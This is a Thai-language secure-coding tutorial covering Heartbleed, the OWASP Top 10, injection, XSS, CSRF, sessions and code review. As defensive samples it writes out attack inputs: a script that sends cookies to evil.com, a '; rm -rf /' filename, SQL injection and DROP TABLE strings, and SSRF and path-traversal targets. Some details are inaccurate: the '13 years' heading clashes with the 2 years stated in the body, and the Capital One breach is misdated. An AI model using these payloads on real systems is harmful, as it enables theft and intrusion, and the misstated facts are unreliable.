# บทความที่ 14: Secure Coding Practices — เขียนโค้ดแบบคนที่รู้ว่ามีคนจะ Hack

**CyberSecurity Awareness Series — Part 5: Developer-Specific**  
เขียนโดย Claude Opus 4.6 | บรรณาธิการ: Tanin T.

---

## เรื่องเล่าของช่องโหว่ที่ "อยู่ได้ 13 ปี"

เดือนเมษายน ปี 2014 — นักวิจัย security ที่ Google และ Codenomicon เปิดเผย vulnerability ใน **OpenSSL** library ที่ใช้กันใน HTTPS ทั่วโลก — ตั้งชื่อให้ว่า **"Heartbleed"** (CVE-2014-0160)

ปัญหาเรียบง่ายมาก — มีฟีเจอร์ TLS heartbeat ที่ client ส่งข้อความ + ขนาดข้อความ — server ตอบข้อความเดิมกลับ:

```c
// จำลอง code เดิมของ OpenSSL
struct heartbeat_msg {
    uint16_t length;     // client บอกว่าข้อความยาวเท่าไหร่
    char payload[];      // ข้อความจริงๆ
};

// Server's response
char response[length];   // 💥 จัดสรรตามที่ client บอก
memcpy(response, msg->payload, length);  // 💥 copy ตามที่ client บอก
return response;
```

ปัญหาคือ — **server ไม่ได้ verify** ว่าข้อความจริงๆ มีขนาดเท่าที่ client บอก

ถ้า client ส่ง:
- `length = 65535` (ขนาดสูงสุด)
- `payload = "x"` (จริงๆ แค่ 1 byte)

Server จะ copy 65535 bytes จาก memory — **ที่อาจมีของคนอื่น** เช่น:
- รหัสผ่าน user คนอื่น
- Private SSL keys
- Session tokens
- Credit card numbers
- ฯลฯ

ภายใน 1 ข้อความ — ผู้โจมตีดึง 64KB random memory ของ server ออกมาอ่าน

**Heartbleed ส่งผลกระทบ:**
- **ครึ่งของเว็บ HTTPS ทั้งโลก** (~500,000 servers)
- รวม Yahoo, Reddit, Imgur, Steam, Stack Overflow, Bitbucket
- รัฐบาลแคนาดา ตำรวจสากล
- ความเสียหายตีค่าหลายร้อยล้านดอลลาร์
- ทุก SSL certificate ในโลกต้อง re-issue

**ที่น่าตกใจที่สุด** — bug นี้ถูก **introduce ในปี 2012** โดย dev ที่อยู่ใน open source community ปกติ — bug อยู่ใน production เป็นเวลา **2 ปี** ก่อนถูกค้นพบ

[อ่านรายละเอียด Heartbleed](https://en.wikipedia.org/wiki/Heartbleed)

> **บทเรียน:** Bug ที่เรียบง่ายที่สุด — "ไม่ verify input" — ก็สามารถทำให้ครึ่งโลกเดือดร้อนได้

ในบทความนี้เราจะดูว่า dev ที่ดี **เขียน code โดยรู้ว่ามีคนจะ hack** เป็นยังไง

---

## OWASP Top 10 — ภาพรวมช่องโหว่ที่พบบ่อย

**OWASP** (Open Web Application Security Project) เป็นองค์กร non-profit ที่ทำ security research

ทุก 3-4 ปี OWASP ปล่อย **OWASP Top 10** — รายการ vulnerability ที่พบบ่อยที่สุดใน web app

ใน 2026 ปัจจุบันใช้ Top 10 ของปี 2021:

### 1. Broken Access Control

```python
# ❌ User เปลี่ยน URL → เห็นข้อมูลคนอื่น
@app.route('/api/users/<user_id>/orders')
def get_orders(user_id):
    return Order.query.filter_by(user_id=user_id).all()
    # ไม่ได้เช็คว่า request มาจาก user_id นี้

# ✅ Verify ownership
@app.route('/api/users/<user_id>/orders')
@login_required
def get_orders(user_id):
    if current_user.id != user_id and not current_user.is_admin:
        abort(403)
    return Order.query.filter_by(user_id=user_id).all()
```

นี่เรียก **IDOR** (Insecure Direct Object Reference) — เปลี่ยน ID ใน URL = เห็นข้อมูลคนอื่น

ตัวอย่างจริง: ในปี 2018 — **USPS** มีช่องโหว่ที่ใครก็เปลี่ยน URL parameter → เห็นข้อมูลของ user 60 ล้านคนได้

### 2. Cryptographic Failures

(ตามที่กล่าวในบทที่ 6)

```python
# ❌ Weak encryption
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# ✅ Strong
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

### 3. Injection

```python
# ❌ SQL Injection
query = f"SELECT * FROM users WHERE email = '{email}'"
# ถ้า email = "x' OR '1'='1" → query กลายเป็น SELECT all users
cursor.execute(query)

# ✅ Parameterized queries
query = "SELECT * FROM users WHERE email = %s"
cursor.execute(query, (email,))
```

(เราจะลงรายละเอียดในส่วน "SQL Injection" ด้านล่าง)

### 4. Insecure Design

ช่องโหว่ที่อยู่ใน **design** ไม่ใช่ code:

- ไม่มี rate limit บน login → brute force ได้
- Password reset ที่ส่ง token ผ่าน email อย่างเดียว → email หาย = บัญชีหาย
- Multi-step process ที่ skip step ได้ผ่าน URL

> **Security ต้องคิดตั้งแต่ออกแบบ ไม่ใช่ "ใส่ทีหลัง"**

### 5. Security Misconfiguration

```yaml
# ❌ Production มี debug enabled
DEBUG=true
EXPOSE_ERRORS=true

# ❌ Default credentials
admin/admin
root/password

# ❌ Verbose error messages
"Error in /var/www/app/db.py line 42: psycopg2.OperationalError: 
connection failed: password authentication failed for user 'app_user'..."
# → ผู้โจมตีรู้ว่า DB เป็น Postgres, user คือ app_user
```

### 6. Vulnerable and Outdated Components

ที่กล่าวในบทที่ 13 — dependency ที่มี vulnerability

### 7. Identification and Authentication Failures

```python
# ❌ Weak session handling
session_id = str(user_id) + str(int(time.time()))
# Predictable!

# ✅ Strong session
import secrets
session_id = secrets.token_hex(32)
```

นอกจากนี้ยังรวม:
- Plaintext password (บทที่ 3)
- Weak password policy
- Session fixation
- ไม่มี 2FA (บทที่ 5)

### 8. Software and Data Integrity Failures

```python
# ❌ Auto-update from URL ที่ไม่ verify signature
exec(requests.get("https://updates.example.com/latest.py").text)

# ✅ Verify signature ก่อน execute
update_code = requests.get("https://updates.example.com/latest.py").text
signature = requests.get("https://updates.example.com/latest.sig").text
verify_signature(update_code, signature, trusted_public_key)
```

### 9. Security Logging and Monitoring Failures

```python
# ❌ ไม่ log อะไรเลย
def login(email, password):
    user = authenticate(email, password)
    return user

# ❌ Log everything (รวม sensitive data)
def login(email, password):
    log.info(f"Login attempt: {email} / {password}")  # 💥 password ใน log
    user = authenticate(email, password)
    log.info(f"Logged in: {user.dict()}")  # 💥 ทุก field รวม PII
    return user

# ✅ Log ที่จำเป็น ไม่ log sensitive
def login(email, password):
    log.info(f"Login attempt", extra={"email": email})
    try:
        user = authenticate(email, password)
        log.info(f"Login successful", extra={"user_id": user.id})
        return user
    except AuthFailed as e:
        log.warning(f"Login failed", extra={"email": email})
        raise
```

### 10. Server-Side Request Forgery (SSRF)

```python
# ❌ Server fetches arbitrary URL ที่ user ระบุ
@app.route('/fetch')
def fetch_url(url):
    return requests.get(url).text
# ถ้า url = "http://169.254.169.254/latest/meta-data/iam/" 
# → ขโมย AWS credentials ของ EC2 server!

# ✅ Allow-list URLs
ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']

@app.route('/fetch')
def fetch_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        abort(400)
    return requests.get(url).text
```

ใน 2021, **Capital One** breach ใช้ SSRF — ผู้โจมตีดึง AWS credentials จาก EC2 metadata → เข้าถึง 100 ล้าน customer records

[อ่าน OWASP Top 10 ฉบับเต็ม](https://owasp.org/Top10/)

---

## Input Validation — กฎเหล็ก #1

> **Never trust user input — anywhere, ever.**

ทุก input ที่มาจากนอก code ของคุณ — **ต้อง validate**:

- Form fields
- URL parameters / query strings
- HTTP headers
- Cookies
- File uploads
- API request bodies
- WebSocket messages
- Environment variables (ในบางกรณี)
- ข้อมูลจาก database (ถ้ามี user-controlled data)

### Validation Layers

#### Layer 1: Type / Format

```python
# Check type
if not isinstance(age, int):
    raise ValueError("Age must be integer")

# Check range
if age < 0 or age > 150:
    raise ValueError("Age out of range")

# Check format (regex)
import re
if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
    raise ValueError("Invalid username")
```

#### Layer 2: Business Rules

```python
def transfer_money(from_account, to_account, amount):
    if amount <= 0:
        raise ValueError("Amount must be positive")
    
    if from_account.balance < amount:
        raise InsufficientFunds()
    
    if from_account.is_locked:
        raise AccountLocked()
    
    if amount > DAILY_LIMIT - from_account.transferred_today:
        raise LimitExceeded()
```

#### Layer 3: Allow-list (preferred over deny-list)

```python
# ❌ Deny-list (block bad)
if "<script>" in user_input:
    reject()
# → ผู้โจมตีหาทาง bypass ได้เสมอ — เช่น <SCRIPT>, <scr<script>ipt>

# ✅ Allow-list (only accept known good)
if not re.match(r'^[a-zA-Z0-9 ]+$', user_input):
    reject()
# → ทุกอย่างที่ไม่ใช่ alphanumeric + space = reject
```

### Sanitization vs Validation

**Validation** = "นี่ valid ไหม? ถ้าไม่ → reject"  
**Sanitization** = "ทำให้ safe ก่อน use"

```python
# Validation
if not is_valid_email(email):
    raise ValueError("Invalid email")
# email valid → ใช้ต่อ

# Sanitization
clean_html = bleach.clean(user_html, tags=['b', 'i', 'em'])
# strip dangerous tags ทั้งหมด → safe to display
```

> **กฎ: Validate ก่อน accept, Sanitize ก่อน use**

### Parameterized Everywhere

อย่า concatenate string สำหรับ:

- **SQL queries** → parameterized queries
- **Shell commands** → use array form, no shell=True
- **HTML output** → templating engine ที่ auto-escape
- **JSON output** → ใช้ JSON serializer ไม่ใช่ string concat

```python
# ❌ Shell injection
import os
filename = request.args.get('filename')
os.system(f"cat {filename}")  # ถ้า filename = "; rm -rf /"

# ✅ Use subprocess with array
import subprocess
subprocess.run(['cat', filename], check=True)
# Even better: ไม่ใช้ shell เลย
with open(filename) as f:
    return f.read()
```

---

## SQL Injection — เก่าแต่ยังอันตราย

SQL injection พบครั้งแรกในปี 1998 — ปี 2026 ยังเป็น vulnerability ที่พบบ่อยที่สุดในเว็บ

### The Classic

```python
# ❌ Vulnerable
def get_user(email):
    query = f"SELECT * FROM users WHERE email = '{email}'"
    return db.execute(query).fetchone()
```

ผู้โจมตีใส่:
```
email = "' OR '1'='1"
```

Query ที่รันจริง:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1'
```

→ Return user **ตัวแรก** ใน table — bypass authentication

### Worse: UNION Attack

```
email = "' UNION SELECT username, password FROM admin --"
```

→ Dump admin credentials

### Even Worse: Stacked Queries

```
email = "'; DROP TABLE users; --"
```

→ ลบ table users

### Defense: Parameterized Queries

```python
# ✅ Python (psycopg2)
cursor.execute(
    "SELECT * FROM users WHERE email = %s",
    (email,)  # ← parameter
)

# ✅ Python (SQLAlchemy)
user = User.query.filter_by(email=email).first()

# ✅ Node.js (pg)
client.query(
    'SELECT * FROM users WHERE email = $1',
    [email]
)

# ✅ Java (PreparedStatement)
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE email = ?"
);
stmt.setString(1, email);
```

Database driver จะ separate query กับ data — input ของผู้โจมตีไม่ถูก parse เป็น SQL

### ORM ช่วยมาก แต่ไม่ Bulletproof

```python
# Prisma / SQLAlchemy / Django ORM
user = db.users.find_unique(where={"email": email})

# แต่ระวัง raw query / string interpolation ใน ORM
# ❌ Prisma raw query
db.$queryRaw(`SELECT * FROM users WHERE email = '${email}'`)
```

### NoSQL Injection

```javascript
// ❌ MongoDB
db.users.find({ email: req.body.email });

// ผู้โจมตีส่ง JSON: { "email": { "$ne": null } }
// → return ทุก user
```

```javascript
// ✅ Validate type first
if (typeof req.body.email !== 'string') {
    return res.status(400).send('Invalid email');
}
db.users.find({ email: req.body.email });
```

---

## XSS (Cross-Site Scripting)

XSS = inject JavaScript ลงในเว็บที่ user เห็น

### Reflected XSS

URL: `https://example.com/search?q=<script>alert(1)</script>`

```html
<!-- ❌ Server render ตรง -->
<p>You searched for: ${query}</p>

<!-- → page renders: -->
<p>You searched for: <script>alert(1)</script></p>
<!-- → JavaScript รัน → ขโมย cookie ของ victim -->
```

### Stored XSS

```javascript
// User comment ที่ malicious
"Great article! <script>fetch('https://evil.com?c='+document.cookie)</script>"

// Save ลง DB → ทุกคนที่เปิด page นั้นจะรัน script
```

### DOM-based XSS

```javascript
// ❌
const name = location.hash.substring(1);
document.getElementById('greeting').innerHTML = `Hello ${name}`;
// URL: ...#<img src=x onerror=alert(1)>
```

### Defense

#### 1. Output Encoding

ใช้ template engine ที่ auto-escape:

```javascript
// React — auto-escape
return <p>You searched for: {query}</p>;
// query = "<script>" → <p>You searched for: &lt;script&gt;</p>

// Vue
<p>You searched for: {{ query }}</p>

// Django
<p>You searched for: {{ query }}</p>

// EJS
<p>You searched for: <%= query %></p>  <!-- escape -->
<p>You searched for: <%- query %></p>  <!-- ❌ no escape -->
```

#### 2. HTML Sanitization

ถ้าจำเป็นต้อง render HTML จาก user:

```javascript
// JavaScript
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty_html);
```

```python
# Python
import bleach
clean = bleach.clean(dirty_html, tags=['b', 'i', 'em', 'strong'])
```

#### 3. Content Security Policy (CSP)

HTTP header ที่บอก browser ว่า script ใดอนุญาต:

```http
Content-Security-Policy: default-src 'self'; 
                         script-src 'self' https://cdn.example.com;
                         style-src 'self' 'unsafe-inline';
```

→ Inline `<script>` ที่ inject เข้ามาจะไม่รัน

#### 4. HttpOnly Cookies

```python
response.set_cookie('session', value, httponly=True, secure=True, samesite='Lax')
```

→ JavaScript อ่าน cookie ไม่ได้ → XSS ก็ขโมย session ไม่ได้

---

## CSRF (Cross-Site Request Forgery)

ผู้โจมตีหลอกให้ user ที่ login อยู่ ทำ action โดยไม่ตั้งใจ

### Attack Scenario

```html
<!-- ใน evil.com -->
<form action="https://bank.example.com/transfer" method="POST">
    <input name="to" value="<attacker_account>">
    <input name="amount" value="100000">
</form>
<script>document.forms[0].submit();</script>
```

User เปิด evil.com — browser auto-submit form กับ cookies ของ bank.example.com → โอนเงิน

### Defense

#### 1. CSRF Token

```python
# Server gen token + ใส่ใน form
@app.route('/transfer', methods=['GET'])
def transfer_form():
    csrf_token = generate_token()
    session['csrf_token'] = csrf_token
    return render_template('transfer.html', csrf_token=csrf_token)

# Server verify token ตอน submit
@app.route('/transfer', methods=['POST'])
def transfer():
    if request.form.get('csrf_token') != session.get('csrf_token'):
        abort(403)
    # process transfer
```

Frameworks ส่วนใหญ่ implement ให้ — Django, Rails, Spring มี CSRF protection built-in

#### 2. SameSite Cookies

```python
response.set_cookie('session', value, samesite='Strict')
```

`SameSite=Strict` → cookie ส่งเฉพาะใน request จาก same site → CSRF ไม่ work

#### 3. Custom Header (สำหรับ AJAX)

```javascript
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': csrfToken,
        'X-Requested-With': 'XMLHttpRequest'  // browser ห้าม set จาก cross-origin
    }
});
```

---

## Authentication & Session Management

### Password Hashing (ที่กล่าวในบทที่ 6)

```python
# ✅
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Verify
bcrypt.checkpw(password.encode(), hashed)
```

### Session Tokens

```python
# ❌ Predictable
session_id = f"{user_id}_{timestamp}"

# ✅ Cryptographically random
import secrets
session_id = secrets.token_urlsafe(32)  # 256-bit entropy
```

### Session Expiration

```python
# ตั้ง expiry
session.permanent = True
app.permanent_session_lifetime = timedelta(hours=2)

# Idle timeout
@app.before_request
def check_idle():
    if 'last_activity' in session:
        if time.time() - session['last_activity'] > 1800:  # 30 minutes
            session.clear()
            return redirect('/login')
    session['last_activity'] = time.time()
```

### Logout

```python
@app.route('/logout', methods=['POST'])
def logout():
    session_id = session.get('id')
    
    # Server-side invalidation
    invalidate_session(session_id)
    
    # Client-side clear
    session.clear()
    
    return redirect('/login')
```

→ **Logout ต้อง invalidate ทั้งฝั่ง client และ server** — เผื่อ token ถูกขโมยไปแล้ว

---

## Principle of Least Privilege ใน Code

### Database User Permissions

```sql
-- ❌ App user เป็น superuser
GRANT ALL PRIVILEGES ON DATABASE myapp TO app_user;

-- ✅ Granular permissions
GRANT SELECT, INSERT, UPDATE ON users TO app_user;
GRANT SELECT ON products TO app_user;
-- ไม่มี DELETE, DROP, ALTER สำหรับ user ปกติ
```

### Service Account

```python
# ❌
DB_USER = 'admin'
DB_PASSWORD = 'admin_password'

# ✅
DB_USER = 'myapp_service'  # เฉพาะ service นี้
DB_PASSWORD = os.environ['MYAPP_DB_PASSWORD']
# Permission limited
```

### File System Access

```python
# ❌ App มี root permission
chmod 777 /var/log/myapp/

# ✅ Specific user + group
chown myapp:myapp /var/log/myapp/
chmod 750 /var/log/myapp/
```

### API Permissions

```python
# Decorator pattern
@app.route('/admin/users')
@require_role('admin')
def admin_users():
    ...

@app.route('/admin/billing')
@require_role('admin', 'billing')
def admin_billing():
    ...
```

---

## Logging & Monitoring

### What to Log

```python
import logging

# Structured logging
log.info("user_login", extra={
    "user_id": user.id,
    "ip": request.remote_addr,
    "user_agent": request.user_agent.string,
    "timestamp": datetime.utcnow().isoformat(),
})

log.warning("login_failed", extra={
    "email": email,
    "ip": request.remote_addr,
    "reason": "invalid_password",
})

log.error("auth_token_invalid", extra={
    "token_prefix": token[:8],  # log แค่ prefix
    "ip": request.remote_addr,
})
```

### What NOT to Log

```python
# ❌ NEVER log:
- Password (plaintext หรือ hashed)
- API keys / secrets
- Credit card numbers (full)
- SSN / national ID (full)
- Health information (HIPAA)
- Sensitive PII without redaction
- Session tokens (full)

# ✅ Log แทน:
- User ID (not PII)
- Email (อาจ ok ขึ้นกับบริบท)
- Last 4 digits of CC
- Hash of token (for correlation)
- Anonymized analytics
```

### Log Aggregation

```yaml
# Production logs ส่งไปที่ centralized:
ELK Stack (Elasticsearch + Logstash + Kibana)
Splunk
Datadog
CloudWatch Logs
Loki
```

→ Search ได้, alert บน pattern, retain ตาม policy

### Alert บน Suspicious Pattern

```python
# Alert ถ้า:
- Failed logins > 5 ใน 5 นาที (per IP/user)
- Login จาก IP ที่ไม่เคย → notify user
- API calls ผิดปกติ (rate, pattern)
- 500 errors เพิ่ม
- Authentication errors เพิ่ม
- Privileged action (admin login, role change, data export)
```

---

## Code Review with Security Lens

### Security Review Checklist

#### Authentication & Authorization

- [ ] Endpoints ที่ต้อง auth — มี `@login_required` ไหม?
- [ ] Endpoints ที่ต้อง role check — มี role verification ไหม?
- [ ] User ดู resource ของคนอื่นได้ไหม? (IDOR)
- [ ] Password hashing ใช้ bcrypt/Argon2 ไหม?
- [ ] Session token random + secure ไหม?

#### Input Validation

- [ ] Input ทุกตัวจาก user ถูก validate ไหม?
- [ ] Allow-list มากกว่า deny-list?
- [ ] Type checking ครบไหม?
- [ ] Range / length / format check?

#### SQL / NoSQL Injection

- [ ] Parameterized queries ทุกที่?
- [ ] Raw query ที่มี string interpolation?
- [ ] ORM ใช้ถูกไหม?

#### XSS

- [ ] User content ถูก escape ตอน render?
- [ ] `dangerouslySetInnerHTML` (React) — มีไหม + จำเป็นไหม?
- [ ] HTML rendering ของ user → DOMPurify / bleach?

#### CSRF

- [ ] State-changing action — มี CSRF token?
- [ ] SameSite cookies?

#### Secrets

- [ ] Hardcoded secrets ไหม?
- [ ] `.env` ใน gitignore?
- [ ] Secrets ใน logs?

#### File Operations

- [ ] Path traversal — `../../../etc/passwd`?
- [ ] File upload — type validation, size limit, sandbox?
- [ ] Filename sanitization?

#### External Calls

- [ ] SSRF — fetch URL ที่ user ระบุ?
- [ ] Timeout บน network calls?
- [ ] Allow-list สำหรับ external URL?

#### Error Handling

- [ ] Errors ไม่เผย sensitive info (stack trace, DB schema)?
- [ ] Generic error message ให้ user, log details ฝั่ง server?

#### Cryptography

- [ ] ใช้ algorithm ที่แนะนำ (AES-GCM, bcrypt, etc.)?
- [ ] Key rotation policy?
- [ ] No hand-rolled crypto?

#### Rate Limiting

- [ ] Login + password reset มี rate limit?
- [ ] API มี rate limit?
- [ ] Resource-intensive operations?

#### Dependencies

- [ ] `npm audit` / `pip-audit` clean?
- [ ] No suspicious new dependencies?

### Static Analysis Tools

#### Multi-language

- **Semgrep** — pattern-based static analysis (open source)
- **CodeQL** (GitHub) — semantic code analysis
- **SonarQube** — code quality + security

#### Per-language

- **JavaScript/TypeScript**: ESLint with security plugins
- **Python**: Bandit, Pylint
- **Java**: SpotBugs, FindSecBugs
- **Go**: gosec
- **Ruby**: Brakeman
- **PHP**: PHPStan, Psalm

```bash
# ตัวอย่าง bandit
pip install bandit
bandit -r ./src
```

### Integrate ใน CI

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: returntocorp/semgrep-action@v1
        with:
          config: 'p/security-audit'
  
  codeql:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
      - uses: github/codeql-action/analyze@v3
```

---

## Defensive Coding Patterns

### Fail Closed, Not Open

```python
# ❌ Fail open — ถ้า error → assume ok
def has_permission(user, resource):
    try:
        return check_permission(user, resource)
    except Exception:
        return True  # 💥

# ✅ Fail closed — error → deny
def has_permission(user, resource):
    try:
        return check_permission(user, resource)
    except Exception as e:
        log.error("permission_check_failed", error=str(e))
        return False
```

### Defense in Depth

```python
# Multiple layers of validation
@app.route('/admin/delete-user/<user_id>', methods=['POST'])
@require_https            # Layer 1: HTTPS only
@require_login            # Layer 2: Must be logged in
@require_role('admin')    # Layer 3: Must be admin
@require_2fa              # Layer 4: Must have 2FA recently verified
@rate_limit(5, '1 hour')  # Layer 5: Limit usage
@csrf_protect             # Layer 6: CSRF token
def delete_user(user_id):
    # Layer 7: Application-level check
    if user_id == current_user.id:
        abort(400, "Cannot delete yourself")
    
    user = User.query.get_or_404(user_id)
    
    # Layer 8: Audit log
    log.info("admin_delete_user", extra={
        "actor_id": current_user.id,
        "target_id": user.id,
    })
    
    # Layer 9: Soft delete (recoverable)
    user.deleted_at = datetime.utcnow()
    db.session.commit()
```

### Immutable Data When Possible

```typescript
// ❌ Mutable data, easy to accidentally modify
function processUser(user: User) {
    user.processed = true;
    return user;
}

// ✅ Immutable
function processUser(user: User): User {
    return { ...user, processed: true };
}
```

### Type Safety

```typescript
// ❌ string everywhere → typos, mistakes
function authorize(user: User, action: string) {
    if (action === 'delete') { ... }
    if (action === 'remove') { ... }  // bug: typo, never matches
}

// ✅ Type-safe enums
enum Action { Delete = 'delete', Update = 'update' }
function authorize(user: User, action: Action) {
    if (action === Action.Delete) { ... }
}
```

### Avoid Dangerous APIs

```python
# ❌ eval / exec — RCE risk
result = eval(user_input)

# ❌ pickle — RCE risk
data = pickle.loads(user_input)

# ❌ yaml.load — RCE risk
config = yaml.load(user_yaml)

# ✅ Safer alternatives
import ast
result = ast.literal_eval(user_input)  # only literal expressions

import json
data = json.loads(user_input)  # JSON only

config = yaml.safe_load(user_yaml)  # no Python objects
```

---

## Action Items

### วันนี้

- [ ] **Audit project ปัจจุบัน** — มี SQL injection / XSS / CSRF ใน code ไหม?
- [ ] **Run static analysis** — Semgrep / Bandit / ESLint security
- [ ] **เช็ค OWASP Top 10** — แต่ละข้อ project ของคุณ vulnerable ไหม?

### สัปดาห์นี้

- [ ] **เพิ่ม CSRF protection** ทุก state-changing endpoint
- [ ] **Setup CSP** ในทุก response
- [ ] **Audit logs** — เช็คว่ามี secrets / PII หลุดไหม
- [ ] **Setup rate limiting** สำหรับ auth + sensitive endpoints

### เดือนนี้

- [ ] **Code review checklist** ทำเป็นเอกสาร
- [ ] **Train ทีม** เรื่อง OWASP Top 10
- [ ] **Penetration test** บน staging environment
- [ ] **Bug bounty program** (ถ้าทำเล่นได้)

### สำหรับ Tech Lead

- [ ] **Security training** สำหรับทีมทุก quarter
- [ ] **Secure coding guidelines** เอกสาร
- [ ] **Code review process** ที่รวม security checklist
- [ ] **CI/CD integration** ของ security tools
- [ ] **Quarterly security review** ของ codebase

---

## บทเรียนชีวิตจากบทความนี้

> **ออกแบบทุกอย่างโดยคิดว่ามีคนจะหาช่องว่าง — ใช้ได้กับ contract, กฎ, และระบบทุกชนิด**

ลองดูตัวอย่างในชีวิตจริง:

#### กฎหมาย

ทำไมกฎหมายถึงต้องเขียนยาวมาก? ทำไม contract ทนายต้องเขียน 50 หน้าทั้งที่ "ตกลงกันแค่ขายของ"?

เพราะ — **มีคนจะหาช่องโหว่** ให้ตีความเป็นประโยชน์ตัวเอง

นักกฎหมายที่เก่ง = เขียนกฎที่อ่านยังไงก็ป้องกันได้

#### Tax

ระบบภาษีต้องคิดเผื่อทุกอย่าง — เพราะคนจะหาทาง avoid

#### กีฬา

กฎฟุตบอลต้องระบุ ละเอียด — เพราะคนจะหาทางใช้ trick เช่น offside trap, time-wasting

#### ความสัมพันธ์

แม้ในความสัมพันธ์ — คนที่ดี **คิดเผื่อ "ถ้ามีปัญหา"**:

- พินัยกรรม — เผื่อตาย
- Prenup — เผื่อหย่า (ในบาง culture)
- Insurance — เผื่อเจ็บป่วย
- Emergency fund — เผื่อตกงาน

ไม่ใช่เพราะมองโลกแย่ — แต่เพราะ **realistic**

> **คนที่ดู naive ไม่ใช่คนที่ trust มาก — แต่เป็นคนที่ไม่คิดว่าโลกมี bad actor**

ในเรื่อง code:

- **Validate input** = อย่า assume user ดี
- **Least privilege** = อย่าให้สิทธิ์เกินจำเป็น
- **Defense in depth** = หลายชั้นเผื่อชั้นใดล้ม
- **Fail closed** = ผิดพลาด → safer side
- **Audit logs** = มีหลักฐานเสมอ

หลักการเดียวกันใช้ในชีวิต:

- **Verify ก่อนเชื่อ** — เพื่อน, deal, news
- **Limit risk exposure** — ลงทุนกระจาย, ไม่บอกทุกอย่างกับทุกคน
- **Multiple safety nets** — เงินสำรอง + ประกัน + ทักษะ
- **Cautious bias** — เมื่อไม่แน่ใจ, default คือ "no"
- **Documentation** — เก็บหลักฐานเสมอ

> **คนที่ "เขียน code โดยรู้ว่ามีคนจะ hack" — มี mindset เดียวกับคนที่ "ใช้ชีวิตโดยรู้ว่าโลกมีคนเอาเปรียบ"**

ทั้งสองคนไม่ใช่ paranoid — แค่ realistic

> **"Be polite, be professional, but have a plan to kill everybody you meet."** — General Mattis

ไม่ได้ให้คุณเป็นทหาร — แต่ให้คุณ **คิดเผื่อ** เสมอ

นั่นคือบทเรียนของบทความนี้ — และของชีวิตในเวลาเดียวกันครับ

ในบทถัดไปเราจะเข้าเรื่อง **API Security** ลึกขึ้น — เพราะ API คือประตูหน้าของระบบสมัยใหม่

---

## อภิธานศัพท์ (Glossary)

- **OWASP:** Open Web Application Security Project
- **OWASP Top 10:** รายการ vulnerability ที่พบบ่อยที่สุด
- **IDOR (Insecure Direct Object Reference):** การเข้าถึงข้อมูลคนอื่นด้วย ID ที่เปลี่ยน
- **SQL Injection:** การ inject SQL ผ่าน user input
- **XSS (Cross-Site Scripting):** การ inject JavaScript
- **CSRF (Cross-Site Request Forgery):** การหลอกให้ user ทำ action โดยไม่ตั้งใจ
- **SSRF (Server-Side Request Forgery):** ทำให้ server ส่ง request ไป URL ที่ไม่ควร
- **Parameterized Query:** SQL ที่แยก data ออกจาก query
- **Sanitization:** ทำให้ input safe ก่อนใช้
- **Validation:** ตรวจว่า input valid ไหม
- **Allow-list / Deny-list:** ระบบ filter ที่อนุญาต/บล็อก
- **CSP (Content Security Policy):** HTTP header ควบคุมว่า script ใดอนุญาต
- **HttpOnly Cookie:** cookie ที่ JavaScript อ่านไม่ได้
- **SameSite Cookie:** restriction ที่บอกว่า cookie ส่งกับ cross-site request ไหม
- **CSRF Token:** token random ที่ verify ว่า request มาจาก legitimate flow
- **Principle of Least Privilege:** ให้สิทธิ์เท่าที่จำเป็นเท่านั้น
- **Defense in Depth:** หลายชั้นป้องกัน
- **Fail Closed:** ผิดพลาด → deny (safer)
- **Static Analysis:** วิเคราะห์ code โดยไม่รัน
- **Semgrep / Bandit / CodeQL:** static analysis tools
- **Penetration Test:** ทดสอบความปลอดภัยโดย simulate การโจมตี

---

## สรุป

1. **OWASP Top 10** คือ vulnerability ที่พบบ่อยที่สุด — รู้ทุกข้อ
2. **Never trust user input** — validate + sanitize ทุกที่
3. **Parameterized queries** ป้องกัน SQL injection — เก่าแต่ยังทำงาน
4. **Output encoding** ป้องกัน XSS — ใช้ template engine ที่ auto-escape
5. **CSRF token + SameSite cookies** ป้องกัน CSRF
6. **Principle of least privilege** ในทุกระดับ — DB user, service account, file system, API
7. **Logging without sensitive data** — รู้ว่าเกิดอะไรขึ้นโดยไม่รั่ว PII
8. **Code review with security lens** — มี checklist ที่ใช้ทุกครั้ง
9. **Defense in depth** — หลายชั้นเผื่อชั้นใดล้ม
10. **Static analysis ใน CI** — auto detect common vulnerabilities

ในบทถัดไป — **API Security** — เรื่องที่กระทบ modern application มากที่สุด ที่ public-facing API endpoint คือประตูหน้าของบ้านของคุณ

— Claude Opus 4.6
